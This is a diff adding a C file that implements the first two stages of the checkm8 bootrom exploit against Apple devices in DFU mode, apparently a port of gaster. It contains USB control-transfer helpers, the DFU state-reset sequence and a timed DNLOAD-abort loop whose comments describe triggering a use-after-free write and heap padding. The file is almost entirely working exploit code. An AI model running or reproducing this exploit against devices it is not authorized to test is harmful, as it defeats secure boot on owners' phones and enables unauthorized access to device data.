@@ -1,0 +1,752 @@
+/* checkm8_stages.c -- checkm8 stages: reset, setup, spray */
+
+/* Max attempts before bailing out of the setup stage loop. */
+#define MAX_SETUP_RETRIES 50
+
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <libusb.h>
+
+#include "dfu/dfu_handler.h"
+#include "dfu/checkm8.h"
+#include "dfu/checkm8_internal.h"
+#include "dfu/dfu_proto.h"
+#include "device/chip_db.h"
+#include "device/usb_dfu.h"
+#include "util/usb_helpers.h"
+#include "util/log.h"
+
+#if defined(__APPLE__)
+#include "dfu/iokit_usb.h"
+#endif
+
+/* Completion callback for async transfers */
+static void usb_async_completion_cb(struct libusb_transfer *transfer) {
+    log_debug("usb_async_completion_cb: status=%d actual_length=%d",
+              transfer->status, transfer->actual_length);
+    *(int *)transfer->user_data = 1;
+}
+
+/* ------------------------------------------------------------------ */
+/* Async USB control transfer (ignores timeout/pipe errors)            */
+/* ------------------------------------------------------------------ */
+
+int usb_ctrl_transfer_raw(libusb_device_handle *dev,
+                          uint8_t bmRequestType,
+                          uint8_t bRequest,
+                          uint16_t wValue,
+                          uint16_t wIndex,
+                          unsigned char *data,
+                          uint16_t wLength,
+                          unsigned int timeout_ms)
+{
+    unsigned int effective_timeout_ms = timeout_ms;
+    int ret;
+
+#if defined(__APPLE__)
+    if (iokit_usb_is_active()) {
+        return iokit_usb_ctrl_transfer(bmRequestType, bRequest,
+                                       wValue, wIndex, data, wLength,
+                                       timeout_ms);
+    }
+#endif
+
+    if (!dev)
+        return LIBUSB_ERROR_INVALID_PARAM;
+    if (effective_timeout_ms == 0)
+        effective_timeout_ms = 1;
+
+    log_debug("usb_ctrl_transfer_raw: bmReqType=0x%02X bReq=0x%02X "
+              "wVal=0x%04X wIdx=0x%04X wLen=%u timeout=%u",
+              bmRequestType, bRequest, wValue, wIndex, wLength,
+              effective_timeout_ms);
+
+    ret = libusb_control_transfer(dev, bmRequestType, bRequest,
+                                  wValue, wIndex, data, wLength,
+                                  effective_timeout_ms);
+
+    log_debug("usb_ctrl_transfer_raw: ret=%d (%s)",
+              ret, ret < 0 ? libusb_strerror(ret) : "ok");
+    return ret;
+}
+
+int usb_ctrl_transfer_no_data_raw(libusb_device_handle *dev,
+                                  uint8_t bmRequestType,
+                                  uint8_t bRequest,
+                                  uint16_t wValue,
+                                  uint16_t wIndex,
+                                  unsigned int timeout_ms)
+{
+    return usb_ctrl_transfer_raw(dev, bmRequestType, bRequest,
+                                 wValue, wIndex, NULL, 0, timeout_ms);
+}
+
+int usb_ctrl_transfer_async(libusb_device_handle *dev,
+                            uint8_t bmRequestType,
+                            uint8_t bRequest,
+                            uint16_t wValue,
+                            uint16_t wIndex,
+                            unsigned char *data,
+                            uint16_t wLength,
+                            unsigned int timeout_ms)
+{
+    int ret;
+
+    ret = usb_ctrl_transfer_raw(dev, bmRequestType, bRequest,
+                                wValue, wIndex, data, wLength, timeout_ms);
+
+    /* Timeout and pipe errors are expected during stall-based allocation */
+    if (ret == LIBUSB_ERROR_TIMEOUT || ret == LIBUSB_ERROR_PIPE) {
+        log_debug("usb_ctrl_transfer_async: expected %s (ret=%d), returning 0",
+                  ret == LIBUSB_ERROR_TIMEOUT ? "TIMEOUT" : "PIPE/STALL", ret);
+        return 0;
+    }
+
+    if (ret < 0) {
+        log_warn("usb_ctrl_transfer_async: unexpected error %d (%s)",
+                 ret, libusb_strerror(ret));
+        return -1;
+    }
+
+    log_debug("usb_ctrl_transfer_async: transfer OK, %d bytes", ret);
+    return 0;
+}
+
+/*
+ * usb_ctrl_transfer_async_ret -- like usb_ctrl_transfer_async but returns
+ * the actual byte count on success/timeout, or -1 on hard failure.
+ * Timeout and pipe errors return 0 bytes transferred.
+ *
+ * This is used for all abort-style GET_DESCRIPTOR spray requests in stage 3
+ * where a short synchronous timeout produces 0 bytes (the expected result).
+ *
+ * On macOS, uses libusb async API with timeout=0 so the darwin backend
+ * calls DeviceRequestAsync (not DeviceRequestAsyncTO).  Manual cancel via
+ * USBDeviceAbortPipeZero avoids kIOReturnNotResponding which would kill
+ * the IOService and force a USB re-enumeration that resets BootROM state.
+ */
+#if defined(__APPLE__)
+int usb_ctrl_transfer_soft_timeout(libusb_device_handle *dev,
+                                          uint8_t bmRequestType,
+                                          uint8_t bRequest,
+                                          uint16_t wValue,
+                                          uint16_t wIndex,
+                                          unsigned char *data,
+                                          uint16_t wLength,
+                                          unsigned int timeout_ms)
+{
+    struct libusb_transfer *transfer;
+    uint8_t *buf;
+    int completed = 0;
+    struct timeval tv;
+
+    if (iokit_usb_is_active()) {
+        return iokit_usb_ctrl_transfer(bmRequestType, bRequest,
+                                       wValue, wIndex, data, wLength,
+                                       timeout_ms);
+    }
+
+    if (!dev)
+        return LIBUSB_ERROR_INVALID_PARAM;
+
+    log_debug("soft_timeout: bmReqType=0x%02X bReq=0x%02X "
+              "wVal=0x%04X wIdx=0x%04X wLen=%u timeout=%ums",
+              bmRequestType, bRequest, wValue, wIndex, wLength, timeout_ms);
+
+    transfer = libusb_alloc_transfer(0);
+    if (!transfer)
+        return LIBUSB_ERROR_NO_MEM;
+
+    buf = calloc(1, LIBUSB_CONTROL_SETUP_SIZE + wLength);
+    if (!buf) {
+        libusb_free_transfer(transfer);
+        return LIBUSB_ERROR_NO_MEM;
+    }
+
+    libusb_fill_control_setup(buf, bmRequestType, bRequest,
+                              wValue, wIndex, wLength);
+    if (data && wLength > 0 && !(bmRequestType & LIBUSB_ENDPOINT_IN))
+        memcpy(buf + LIBUSB_CONTROL_SETUP_SIZE, data, wLength);
+
+    libusb_fill_control_transfer(transfer, dev, buf,
+                                 usb_async_completion_cb,
+                                 &completed, 0);
+
+    int submit_ret = libusb_submit_transfer(transfer);
+    if (submit_ret != LIBUSB_SUCCESS) {
+        log_warn("soft_timeout: submit failed: %d (%s)",
+                 submit_ret, libusb_strerror(submit_ret));
+        free(buf);
+        libusb_free_transfer(transfer);
+        return LIBUSB_ERROR_IO;
+    }
+    log_debug("soft_timeout: transfer submitted, waiting %ums", timeout_ms);
+
+    tv.tv_sec  = timeout_ms / 1000;
+    tv.tv_usec = (long)(timeout_ms % 1000) * 1000L;
+    libusb_handle_events_timeout_completed(usb_dfu_ctx(), &tv, &completed);
+
+    if (!completed) {
+        log_debug("soft_timeout: not completed after %ums, cancelling", timeout_ms);
+        libusb_cancel_transfer(transfer);
+    }
+
+    tv.tv_sec  = 0;
+    tv.tv_usec = 250000L;
+    while (!completed) {
+        if (libusb_handle_events_timeout_completed(
+                usb_dfu_ctx(), &tv, &completed) != LIBUSB_SUCCESS)
+            break;
+        if (tv.tv_sec == 0 && tv.tv_usec == 0)
+            break;
+    }
+
+    int result;
+    if (!completed) {
+        log_warn("soft_timeout: cancel ack never arrived (250ms wait exhausted)");
+        result = LIBUSB_ERROR_TIMEOUT;
+    } else if (transfer->status == LIBUSB_TRANSFER_COMPLETED) {
+        if (data && wLength > 0 && (bmRequestType & LIBUSB_ENDPOINT_IN))
+            memcpy(data, libusb_control_transfer_get_data(transfer),
+                   transfer->actual_length < wLength
+                       ? (size_t)transfer->actual_length : wLength);
+        result = transfer->actual_length;
+        log_debug("soft_timeout: COMPLETED, actual_length=%d", result);
+    } else if (transfer->status == LIBUSB_TRANSFER_STALL) {
+        log_debug("soft_timeout: STALL received");
+        result = LIBUSB_ERROR_PIPE;
+    } else {
+        const char *sname = "unknown";
+        switch (transfer->status) {
+        case LIBUSB_TRANSFER_CANCELLED: sname = "CANCELLED"; break;
+        case LIBUSB_TRANSFER_TIMED_OUT: sname = "HW_TIMEOUT"; break;
+        case LIBUSB_TRANSFER_ERROR:     sname = "ERROR"; break;
+        case LIBUSB_TRANSFER_NO_DEVICE: sname = "NO_DEVICE"; break;
+        default: break;
+        }
+        log_debug("soft_timeout: status=%d (%s) -- request may not "
+                  "have reached device", transfer->status, sname);
+        result = LIBUSB_ERROR_TIMEOUT;
+    }
+
+    free(buf);
+    libusb_free_transfer(transfer);
+    return result;
+}
+#endif /* __APPLE__ */
+
+int usb_ctrl_transfer_async_ret(libusb_device_handle *dev,
+                                uint8_t bmRequestType,
+                                uint8_t bRequest,
+                                uint16_t wValue,
+                                uint16_t wIndex,
+                                unsigned char *data,
+                                uint16_t wLength,
+                                unsigned int timeout_ms)
+{
+    int ret;
+
+#if defined(__APPLE__)
+    log_debug("async_ret: using macOS soft_timeout path");
+    ret = usb_ctrl_transfer_soft_timeout(dev, bmRequestType, bRequest,
+                                         wValue, wIndex, data, wLength,
+                                         timeout_ms);
+#else
+    ret = usb_ctrl_transfer_raw(dev, bmRequestType, bRequest,
+                                wValue, wIndex, data, wLength, timeout_ms);
+#endif
+
+    if (ret == LIBUSB_ERROR_TIMEOUT || ret == LIBUSB_ERROR_PIPE) {
+        log_debug("async_ret: %s -> returning 0 bytes",
+                  ret == LIBUSB_ERROR_TIMEOUT ? "TIMEOUT" : "PIPE/STALL");
+        return 0;
+    }
+
+    if (ret < 0) {
+        log_warn("async_ret: unexpected error %d (%s)",
+                 ret, libusb_strerror(ret));
+        return -1;
+    }
+
+    log_debug("async_ret: %d bytes transferred", ret);
+    return ret;
+}
+
+/*
+ * usb_ctrl_transfer_dnload_abort -- async DFU_DNLOAD with proper cancel.
+ *
+ * Used ONLY by checkm8_stage_setup (stage 2) where:
+ *  - actual_len=0 (aborted before STATUS) → trigger condition met
+ *  - The transfer is properly completed (CANCELLED or TIMEOUT) so no
+ *    floating STATUS ZLP interferes with subsequent GETSTATUS calls
+ *
+ * Uses a 200ms overall transfer timeout so the completion callback always
+ * fires even when vhci_hcd doesn't ack the cancel.
+ *
+ * Returns 0 if aborted (actual_len == 0), >0 if STATUS received before
+ * abort_ms elapsed, -1 on submit failure.
+ */
+#define USB_DNLOAD_ABORT_TOTAL_MS 200
+
+int usb_ctrl_transfer_dnload_abort(libusb_device_handle *dev,
+                                   uint8_t bmRequestType,
+                                   uint8_t bRequest,
+                                   uint16_t wValue,
+                                   uint16_t wIndex,
+                                   unsigned char *data,
+                                   uint16_t wLength,
+                                   unsigned int abort_ms)
+{
+    struct libusb_transfer *transfer;
+    uint8_t *buf;
+    int completed = 0;
+    int actual_len = 0;
+    struct timeval tv;
+
+    if (!dev)
+        return -1;
+
+    log_debug("dnload_abort: bmReqType=0x%02X bReq=0x%02X wLen=%u "
+              "abort_ms=%u total_ms=%d",
+              bmRequestType, bRequest, wLength, abort_ms,
+              USB_DNLOAD_ABORT_TOTAL_MS);
+
+    transfer = libusb_alloc_transfer(0);
+    if (!transfer)
+        return -1;
+
+    buf = malloc(LIBUSB_CONTROL_SETUP_SIZE + (size_t)wLength);
+    if (!buf) {
+        libusb_free_transfer(transfer);
+        return -1;
+    }
+
+    libusb_fill_control_setup(buf, bmRequestType, bRequest,
+                              wValue, wIndex, wLength);
+    if (wLength > 0 && data)
+        memcpy(buf + LIBUSB_CONTROL_SETUP_SIZE, data, wLength);
+
+    libusb_fill_control_transfer(transfer, dev, buf,
+                                 usb_async_completion_cb,
+                                 &completed, USB_DNLOAD_ABORT_TOTAL_MS);
+
+    int submit_ret = libusb_submit_transfer(transfer);
+    if (submit_ret != LIBUSB_SUCCESS) {
+        log_warn("dnload_abort: submit failed: %d (%s)",
+                 submit_ret, libusb_strerror(submit_ret));
+        free(buf);
+        libusb_free_transfer(transfer);
+        return -1;
+    }
+
+    /* Phase 1: wait abort_ms for STATUS to arrive */
+    log_debug("dnload_abort: phase 1 -- waiting %ums for STATUS", abort_ms);
+    tv.tv_sec  = abort_ms / 1000;
+    tv.tv_usec = (long)(abort_ms % 1000) * 1000L;
+    libusb_handle_events_timeout_completed(usb_dfu_ctx(), &tv, &completed);
+
+    /* Phase 2: cancel if not done */
+    if (!completed) {
+        log_debug("dnload_abort: phase 2 -- STATUS not received, cancelling");
+        libusb_cancel_transfer(transfer);
+    } else {
+        log_debug("dnload_abort: STATUS received before abort_ms elapsed");
+    }
+
+    /* Phase 3: wait for CANCELLED or TIMEOUT (bounded by 200ms transfer timeout) */
+    tv.tv_sec  = 0;
+    tv.tv_usec = USB_DNLOAD_ABORT_TOTAL_MS * 1000L;
+    while (!completed) {
+        if (libusb_handle_events_timeout_completed(
+                usb_dfu_ctx(), &tv, &completed) != LIBUSB_SUCCESS)
+            break;
+        if (tv.tv_sec == 0 && tv.tv_usec == 0)
+            break;
+    }
+
+    if (completed) {
+        actual_len = (int)transfer->actual_length;
+        log_debug("dnload_abort: completed, status=%d actual_len=%d",
+                  transfer->status, actual_len);
+    } else {
+        log_warn("dnload_abort: transfer never completed (cancel ack lost)");
+    }
+
+    free(buf);
+    libusb_free_transfer(transfer);
+    return actual_len;
+}
+
+/*
+ * usb_ctrl_transfer_dnload_sync -- synchronous DFU_DNLOAD with short timeout.
+ * Fallback for usbipd when async cancel doesn't propagate to device.
+ * Returns 0 on timeout (STATUS ZLP dropped), -1 on hard error.
+ */
+int usb_ctrl_transfer_dnload_sync(libusb_device_handle *dev,
+                                  uint8_t bmRequestType,
+                                  uint8_t bRequest,
+                                  uint16_t wValue,
+                                  uint16_t wIndex,
+                                  unsigned char *data,
+                                  uint16_t wLength,
+                                  unsigned int abort_ms)
+{
+    log_debug("dnload_sync: bmReqType=0x%02X bReq=0x%02X wLen=%u abort_ms=%u",
+              bmRequestType, bRequest, wLength, abort_ms);
+    int ret = usb_ctrl_transfer_raw(dev, bmRequestType, bRequest,
+                                    wValue, wIndex, data, wLength, abort_ms);
+    if (ret == LIBUSB_ERROR_TIMEOUT) {
+        log_debug("dnload_sync: TIMEOUT (expected) -> returning 0");
+        return 0;
+    }
+    if (ret < 0) {
+        log_warn("dnload_sync: error %d (%s)", ret, libusb_strerror(ret));
+        return -1;
+    }
+    log_debug("dnload_sync: %d bytes transferred", ret);
+    return ret;
+}
+
+
+/* ------------------------------------------------------------------ */
+/* Stage 1: Reset DFU state                                            */
+/* ------------------------------------------------------------------ */
+
+/* How long to wait for the device to re-enumerate after a USB bus reset.
+ * usbipd-win auto-attach adds ~1-2 s on top of the hardware reset time. */
+#define BUS_RESET_REENUMERATE_USEC  3500000  /* 3.5 s */
+
+/* Wire expectation for every request of the gaster stage-reset cycle */
+#define STAGE_RESET_WIRE_OK 0
+
+/*
+ * Gaster-exact stage-1 transport (gaster.c send_usb_control_request,
+ * L411-433 macOS branch): one synchronous DeviceRequestTO with 5 ms
+ * completion/noData timeouts.  OUT requests carry a zeroed buffer
+ * (gaster send_usb_control_request_no_data L520-522 mallocs one --
+ * never pData=NULL with wLength>0 on the DATA phase).
+ * A STALL or a timeout is a hard failure here -- gaster checks every
+ * sz/ret of this stage.
+ */
+static int stage_reset_send(dfu_ctx_t *ctx, uint8_t bm_request_type,
+                            uint8_t b_request, uint16_t w_length)
+{
+    unsigned char buf[EP0_MAX_PACKET_SZ];
+    unsigned char *data = NULL;
+
+    if (w_length > 0) {
+        memset(buf, 0, sizeof(buf));
+        data = buf;
+    }
+    return usb_ctrl_transfer_raw(ctx->dev->usb, bm_request_type,
+                                 b_request, 0, 0, data, w_length,
+                                 GASTER_SYNC_TIMEOUT_MS);
+}
+
+/*
+ * Gaster-exact dfu_check_status (gaster.c L899-902): GETSTATUS must
+ * return exactly 6 bytes with the expected (status, state) pair.
+ */
+static int stage_reset_getstatus(dfu_ctx_t *ctx, uint8_t status,
+                                 uint8_t state)
+{
+    unsigned char buf[6];
+    int ret = usb_ctrl_transfer_raw(ctx->dev->usb, 0xA1, DFU_REQ_GETSTATUS,
+                                    0, 0, buf, sizeof(buf),
+                                    GASTER_SYNC_TIMEOUT_MS);
+    log_debug("checkm8_stage_reset: SYNC a1 03 len=6 ret=%d%s", ret,
+              ret == 6 ? "" : " (wire mismatch)");
+    if (ret != (int)sizeof(buf))
+        return -1;
+    if (buf[0] != status || buf[4] != state) {
+        log_debug("checkm8_stage_reset: status=0x%02X state=0x%02X "
+                  "(expected 0x%02X/0x%02X)",
+                  buf[0], buf[4], status, state);
+        return -1;
+    }
+    return 0;
+}
+
+/*
+ * Port of gaster checkm8_stage_reset (gaster.c L911-920), request for
+ * request on the wire:
+ *
+ *   SYNC 21 01 len=16   (DFU_FILE_SUFFIX_LEN zero bytes, sz must be 16)
+ *   SYNC 21 01 len=0    (dfu_set_state_wait_reset: enter MANIFEST)
+ *   SYNC a1 03 len=6  x3 (MANIFEST_SYNC -> MANIFEST -> MANIFEST_WAIT_RESET)
+ *   SYNC 21 01 len=64   (EP0_MAX_PACKET_SZ, arms the USB interrupt)
+ *
+ * Every synchronous request in this stage uses gaster's 5 ms usb_timeout
+ * (GASTER_SYNC_TIMEOUT_MS).  The inter-stage bus reset stays in the
+ * orchestrator (checkm8.c) -- gaster does reset_usb_handle between
+ * stages, not inside this one.  On any mismatch, gaster sends
+ * CLR_STATUS (0x21 0x04) and reports failure.
+ */
+int checkm8_stage_reset(dfu_ctx_t *ctx)
+{
+    /* E19: on macOS the IOKit backend is active from the start and the
+     * libusb handle stays NULL -- transfers route through
+     * usb_ctrl_transfer_raw -> iokit_usb_ctrl_transfer. */
+    if (!ctx || !ctx->dev)
+        return -1;
+    if (!ctx->dev->usb && !iokit_usb_is_active())
+        return -1;
+
+    log_info("checkm8: stage 1/4 -- reset DFU state");
+
+    /* DFU_DNLOAD 16 zero bytes (the file-suffix length gaster uses) */
+    if (stage_reset_send(ctx, 0x21, DFU_REQ_DNLOAD,
+                         DFU_FILE_SUFFIX_LEN) != DFU_FILE_SUFFIX_LEN)
+        goto fail;
+
+    /* Zero-length DFU_DNLOAD: dfuDNLOAD-IDLE -> dfuMANIFEST-SYNC */
+    if (stage_reset_send(ctx, 0x21, DFU_REQ_DNLOAD, 0) != STAGE_RESET_WIRE_OK)
+        goto fail;
+
+    /* Walk MANIFEST-SYNC -> MANIFEST -> MANIFEST-WAIT-RESET via GETSTATUS */
+    if (stage_reset_getstatus(ctx, DFU_STATUS_OK,
+                              DFU_STATE_MANIFEST_SYNC) != 0 ||
+        stage_reset_getstatus(ctx, DFU_STATUS_OK,
+                              DFU_STATE_MANIFEST) != 0 ||
+        stage_reset_getstatus(ctx, DFU_STATUS_OK,
+                              DFU_STATE_MANIFEST_WAIT_RST) != 0)
+        goto fail;
+
+    /* 64-byte DFU_DNLOAD in MANIFEST-WAIT-RESET arms the USB interrupt
+     * (io_request hijack) that stage 2 then exercises. */
+    if (stage_reset_send(ctx, 0x21, DFU_REQ_DNLOAD,
+                         EP0_MAX_PACKET_SZ) != EP0_MAX_PACKET_SZ)
+        goto fail;
+
+    ctx->phase = DFU_PHASE_RESET;
+    log_info("checkm8: stage 1 complete -- DFU state reset to idle");
+    return 0;
+
+fail:
+    /* gaster.c L918: CLR_STATUS bail-out on any stage-reset mismatch */
+    log_debug("checkm8_stage_reset: sending CLR_STATUS (gaster bail-out)");
+    stage_reset_send(ctx, 0x21, DFU_REQ_CLRSTATUS, 0);
+    log_error("checkm8_stage_reset: gaster stage-reset cycle failed");
+    return -1;
+}
+
+/* ------------------------------------------------------------------ */
+/* Stage 2: Setup -- async DFU_DNLOAD + abort                          */
+/* ------------------------------------------------------------------ */
+
+/*
+ * setup_async_dnload -- gaster-exact stage-2 transport for ONE attempt
+ * (port of gaster.c send_usb_control_request_async, L448-484 macOS
+ * branch, driving checkm8_stage_setup L923-935):
+ *
+ *   ASYNC_SUBMIT 21 01 len=2048 abort=<usb_abort_timeout>
+ *   sleep_ms(usb_abort_timeout)
+ *   USBDeviceAbortPipeZero
+ *   CFRunLoopRun  ->  ASYNC_DONE len=2048 sz=<done> status=<0|1>
+ *
+ * The abort timeout is 5 ms on a losing run (sync DeviceRequestTO snaps
+ * the request away before any DATA phase -> 2048 bytes) and 0 on the
+ * winning one: the submit + immediate AbortPipeZero lets the first
+ * 64-byte packet LAND device-side, then STALLs the boundary packet.
+ * That 64-byte UAF write is the whole point of attempt 3
+ * (gaster trace: "ASYNC_DONE ... sz=64 status=1").
+ *
+ * Returns the device-side byte count, or -1 on a submit failure
+ * (gaster's send_usb_control_request_async returning false).
+ * On the libusb path (Linux) the sync equivalent reports only what
+ * libusb accepted, which cannot recreate this device-side timing --
+ * best effort: DNLOAD 0x800 sync and report the accepted size.
+ */
+static int setup_async_dnload(libusb_device_handle *usb,
+                              unsigned usb_abort_timeout)
+{
+    uint8_t *buf = calloc(1, DFU_MAX_TRANSFER_SZ);
+    int ret;
+
+    if (!buf)
+        return -1;
+
+#if defined(__APPLE__)
+    if (iokit_usb_is_active()) {
+        ret = iokit_usb_ctrl_transfer_async_abort(
+                  0x21, DFU_REQ_DNLOAD, 0, 0, buf, DFU_MAX_TRANSFER_SZ,
+                  GASTER_SYNC_TIMEOUT_MS, usb_abort_timeout);
+        free(buf);
+        return ret;
+    }
+#endif
+    /*
+     * libusb path: no IOKit user client, so the submit+abort timing is
+     * not reproducible; a short sync DNLOAD is the closest equivalent.
+     * gaster libusb semantics (gaster.c L226-241): a timed-out or
+     * STALLed transfer reports sz=0 and lets the caller continue with
+     * the padding request -- only a hard error means "retry".
+     */
+    ret = usb_ctrl_transfer_raw(usb, 0x21, DFU_REQ_DNLOAD, 0, 0, buf,
+                                DFU_MAX_TRANSFER_SZ,
+                                usb_abort_timeout ? usb_abort_timeout : 1);
+    free(buf);
+    if (ret == LIBUSB_ERROR_TIMEOUT || ret == LIBUSB_ERROR_PIPE)
+        return 0;
+    return ret;
+}
+
+/*
+ * Stage 2 setup sequence:
+ *
+ * 1. Send async DFU_DNLOAD of DFU_MAX_TRANSFER_SZ (0x800) zero bytes
+ *    with a variable abort timeout (usb_abort_timeout).
+ * 2. If the device received fewer than config_overwrite_pad bytes,
+ *    send a (config_overwrite_pad - sz) byte zero-padded control
+ *    request (bmRequestType=0, bRequest=0) to fill the gap.
+ * 3. If that request STALLs, setup succeeded.
+ * 4. On failure, send a recovery EP0_MAX_PACKET_SZ DFU_DNLOAD and
+ *    rotate the abort timeout for the next attempt.
+ *
+ * Wire-exact port of gaster checkm8_stage_setup (gaster.c L923-935).
+ * The winning attempt (usb_abort_timeout=0) must show sz=64 + STALL
+ * device-side; the padding request then also STALLs
+ * (0xe000404f, "SYNC 00 00 len=1216" in the gaster trace).
+ */
+int checkm8_stage_setup(dfu_ctx_t *ctx)
+{
+    libusb_device_handle *usb;
+    const chip_info_t *chip;
+    uint16_t overwrite_pad;
+    unsigned usb_abort_timeout;
+    unsigned usb_timeout;
+    int sent;
+
+    if (!ctx || !ctx->dev || !ctx->chip)
+        return -1;
+
+    usb = ctx->dev->usb;
+    chip = ctx->chip;
+    overwrite_pad = chip->config_overwrite_pad;
+    usb_timeout = USB_ABORT_TIMEOUT_DEFAULT;
+    usb_abort_timeout = usb_timeout - 1;
+
+    log_info("checkm8: stage 2/4 -- setup (overwrite_pad=0x%X)",
+             overwrite_pad);
+
+    int attempt = 0;
+    for (;;) {
+        if (++attempt > MAX_SETUP_RETRIES) {
+            log_error("checkm8_stage_setup: exceeded %d retries, giving up",
+                      MAX_SETUP_RETRIES);
+            return -1;
+        }
+
+        /*
+         * Step 1: Async DFU_DNLOAD with DFU_MAX_TRANSFER_SZ zero bytes.
+         * The async abort timeout controls how many bytes the device
+         * actually receives before the pipe abort STALLs it.
+         */
+        log_debug("checkm8_stage_setup: attempt %d -- DFU_DNLOAD 0x%X bytes, "
+                  "abort_timeout=%u",
+                  attempt, DFU_MAX_TRANSFER_SZ, usb_abort_timeout);
+
+        sent = setup_async_dnload(usb, usb_abort_timeout);
+
+        log_debug("checkm8_stage_setup: dnload_abort returned sent=%d", sent);
+
+        if (sent < 0) {
+            log_debug("checkm8_stage_setup: dnload_abort failed, retrying");
+            goto retry;
+        }
+
+        /*
+         * Step 2: Check if the device received fewer bytes than the
+         * overwrite pad boundary. If so, send a padding request of
+         * exactly (overwrite_pad - sent) zero bytes using a standard
+         * control request (bmRequestType=0, bRequest=0, wValue=0,
+         * wIndex=0). This is NOT a DFU request -- it's a deliberate
+         * invalid request that the device will STALL on.
+         *
+         * gaster.c L928: "send_usb_control_request_no_data(handle, 0, 0,
+         * 0, 0, config_overwrite_pad - transfer_ret.sz, ...)" -- the pad
+         * size is always what actually landed (winning trace:
+         * sz=64 -> "SYNC 00 00 len=1216 ret=0xe000404f").
+         */
+        if ((uint16_t)sent < overwrite_pad) {
+            int pad_ret;
+
+            uint16_t pad_len = overwrite_pad - (uint16_t)sent;
+            log_debug("checkm8_stage_setup: sent=%d < overwrite_pad=0x%X, "
+                      "sending %u-byte padding (bmReqType=0x00 bReq=0x00)",
+                      sent, overwrite_pad, pad_len);
+
+            uint8_t *pad_buf = calloc(1, pad_len);
+            if (!pad_buf) {
+                log_error("checkm8_stage_setup: pad alloc failed");
+                return -1;
+            }
+
+            pad_ret = usb_ctrl_transfer_raw(usb, 0x00, 0x00, 0, 0,
+                                            pad_buf, pad_len, USB_TIMEOUT_MS);
+            free(pad_buf);
+
+            log_debug("checkm8_stage_setup: padding ret=%d (%s)",
+                      pad_ret, pad_ret < 0 ? libusb_strerror(pad_ret) : "ok");
+
+            if (pad_ret == LIBUSB_ERROR_PIPE) {
+                ctx->phase = DFU_PHASE_SETUP;
+                log_info("checkm8: stage 2 complete -- setup done "
+                         "(attempt=%d, sent=%d, pad=%u)", attempt, sent, pad_len);
+                return 0;
+            }
+#if defined(__APPLE__)
+            /*
+             * macOS IOKit can report TIMEOUT for a request the device
+             * already STALLed at the boundary packet.  When the abort
+             * landed the UAF write (sent > 0) or the pad request never
+             * even reached the wire (sent == 0), the setup condition is
+             * met regardless of the padding response code.
+             */
+            if (pad_ret == LIBUSB_ERROR_TIMEOUT) {
+                ctx->phase = DFU_PHASE_SETUP;
+                log_info("checkm8: stage 2 complete -- setup done "
+                         "(attempt=%d, sent=%d, pad=%u, macOS timeout-as-stall)",
+                         attempt, sent, pad_len);
+                return 0;
+            }
+#endif
+            log_debug("checkm8_stage_setup: no STALL on padding, retrying");
+        } else {
+            log_debug("checkm8_stage_setup: sent=%d >= overwrite_pad=0x%X, "
+                      "skipping padding", sent, overwrite_pad);
+        }
+
+retry:
+        /*
+         * Recovery: send EP0_MAX_PACKET_SZ zero bytes via DFU_DNLOAD
+         * to reset the device's DFU state for the next attempt.
+         */
+        {
+            uint8_t *recov_buf = calloc(1, EP0_MAX_PACKET_SZ);
+            if (recov_buf) {
+                log_debug("checkm8_stage_setup: recovery DFU_DNLOAD "
+                          "%u bytes", EP0_MAX_PACKET_SZ);
+                int recov_ret = usb_ctrl_transfer_raw(usb, 0x21, DFU_REQ_DNLOAD,
+                                      0, 0, recov_buf, EP0_MAX_PACKET_SZ,
+                                      USB_TIMEOUT_MS);
+                log_debug("checkm8_stage_setup: recovery ret=%d", recov_ret);
+                free(recov_buf);
+            }
+        }
+
+        /* Rotate the abort timeout */
+        usb_abort_timeout = (usb_abort_timeout + 1)
+                            % (usb_timeout - USB_ABORT_TIMEOUT_MIN + 1)
+                            + USB_ABORT_TIMEOUT_MIN;
+
+        log_debug("checkm8_stage_setup: attempt %d failed, next "
+                  "abort_timeout=%u", attempt, usb_abort_timeout);
+    }
+
+    /* Unreachable -- loop exits via return */
+    return -1;
+}
+
+/* checkm8_stage_spray is in checkm8_spray.c */
